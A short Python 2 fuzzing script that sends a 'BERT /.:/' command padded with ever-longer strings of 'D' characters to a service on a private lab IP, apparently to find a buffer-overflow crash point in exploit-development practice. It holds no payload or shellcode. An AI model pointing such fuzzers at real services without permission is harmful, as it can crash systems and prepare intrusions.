#! /usr/bin/python2
import socket;
import sys;

ip="192.168.0.153"
port = 8777 # Bert Port
prefix = 'BERT /.:/'

buffer = ["D"]
counter = 100
while len(buffer) <= 30:
    buffer.append("D" * counter)
    counter = counter + 200
    

for string in buffer:
    print("Fuzzing BERT with %s bytes " % len(string))
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect = s.connect((ip,port))
    s.send(prefix+string)
    s.close()
